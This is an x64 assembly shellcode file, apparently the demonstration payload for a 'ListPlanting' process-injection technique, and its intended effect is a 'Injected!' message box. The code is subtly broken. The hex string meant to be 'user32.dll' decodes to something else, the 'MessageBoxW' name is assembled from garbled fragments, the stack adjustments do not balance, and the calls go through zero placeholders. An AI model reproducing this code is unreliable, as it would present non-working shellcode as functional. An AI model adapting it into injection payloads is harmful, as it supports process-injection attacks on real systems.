; msgbox_shellcode.asm
[BITS 64]
[ORG 0]

    ; Align stack
    sub rsp, 0x28

    ; LoadLibraryA("user32.dll")
    mov rax, 0x6C6C642E32333A72     ; "r2.3dll" (reversed)
    push rax
    mov rcx, rsp
    call [rel loadlib]

    ; GetProcAddress(hUser32, "MessageBoxW")
    mov rax, 0x426567617373656D     ; "MessageB"
    push rax
    mov rax, 0x6F72506C6548         ; "HellPro"
    push rax
    mov rdx, rsp
    mov rcx, [rel hUser32]
    call [rel getproc]

    ; MessageBoxW(0, L"Injected!", L"ListPlanting", 0)
    xor r9, r9                      ; uType = MB_OK
    lea r8, [rel title]             ; lpCaption
    lea rdx, [rel message]          ; lpText
    xor rcx, rcx                    ; hWnd = NULL
    call rax

    add rsp, 0x50
    ret

loadlib:
    dq 0x0 ; placeholder for LoadLibraryA
getproc:
    dq 0x0 ; placeholder for GetProcAddress
hUser32:
    dq 0x0 ; placeholder for user32.dll handle

message:
    db 'I',0,'n',0,'j',0,'e',0,'c',0,'t',0,'e',0,'d',0,'!',0,0,0
title:
    db 'L',0,'i',0,'s',0,'t',0,'P',0,'l',0,'a',0,'n',0,'t',0,'i',0,'n',0,'g',0,0,0